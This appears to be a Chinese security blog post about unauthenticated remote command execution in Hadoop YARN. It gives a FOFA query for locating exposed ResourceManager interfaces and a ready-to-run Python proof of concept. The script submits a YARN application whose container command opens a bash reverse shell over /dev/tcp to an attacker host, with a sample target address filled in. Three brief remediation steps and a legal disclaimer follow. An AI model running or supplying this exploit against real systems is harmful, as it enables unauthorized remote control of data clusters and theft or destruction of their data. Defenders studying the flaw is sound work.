#  Hadoop-未授权访问-内置配合命令执行 RCE   
无问之路  巢安实验室   2024-10-20 10:20  
  
**简介**  
  
Hadoop是一个由Apache基金会所开发的  
分布式系统  
基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。Hadoop实现了一个  
分布式文件系统  
（ Distributed File System），其中一个组件是  
HDFS  
（Hadoop Distributed File System）。HDFS有高  
容错性  
的特点，并且设计用来部署在低廉的（low-cost）硬件上；而且它提供高吞吐量（high throughput）来访问  
应用程序  
的数据，适合那些有着超大数据集（large data set）的应用程序。HDFS放宽了（relax）  
POSIX  
的要求，可以以流的形式访问（streaming access）文件系统中的数据。Hadoop的框架最核心的设计就是：  
HDFS  
和  
MapReduce  
。HDFS为海量的数据提供了存储，而MapReduce则为海量的数据提供了计算。  
  
Hadoop是一个由   
Apache  
基金会所开发的分布式  
系统基础架构，由于服务器直接在开放了Hadoop机器HDFS的50070 web端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。  
  
Hadoop中有多种端口，这些端口用于不同的  
服务和通信。以下是Hadoop中常见的端口以及它们的用途：  
  
```
NameNode Web界面端口 (默认: 9870)
NameNode 对客户端服务端口 (默认: 8020)
Secondary NameNode Web界面端口 (默认: 9868)
Secondary NameNode 对DN的服务端口 (默认: 50020)
ResourceManager 管理界面端口 (默认: 8088)
DataNode 数据传输端口 (默认: 50010)
DataNode 服务端口 (默认: 50075)
NodeManager 管理界面端口 (默认: 8042)
```  
  
  
**FOFA语句**  
```
"/cluster/apps"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxvKBicviaicZdUjDy95b0w45EuTPMl8S0Lf7Pl4SBzwHib746kVkIiaicoHy0aVRvjv0j7KogkFfOqEwKQ/640?wx_fmt=png&from=appmsg "")  
  
**POC**  
```
import requests

target = 'http://123.58.224.8:31227/'     # 目标地址
lhost = 'x.x.x.x'                         # 接收shell的攻击机ip

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxvKBicviaicZdUjDy95b0w45EBrhSP5NHN1uPlA5KLTD7nF9R6pE1oP3rCx6670ExUsbu1zuHTdoykg/640?wx_fmt=png&from=appmsg "")  
  
**修复方法**  
- 关闭Hadoop Web管理页面。  
  
- 开启身份验证，防止未授权用户访问。  
  
- 设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问。  
  
**参考链接**  
```
https://baike.baidu.com/item/Hadoop/3526507?fr=ge_ala
```  
  
真心感觉自己要学习的知识好多，也有好多大神卧虎藏龙、开源分享。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。  
  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
  
  
  
  
  
  
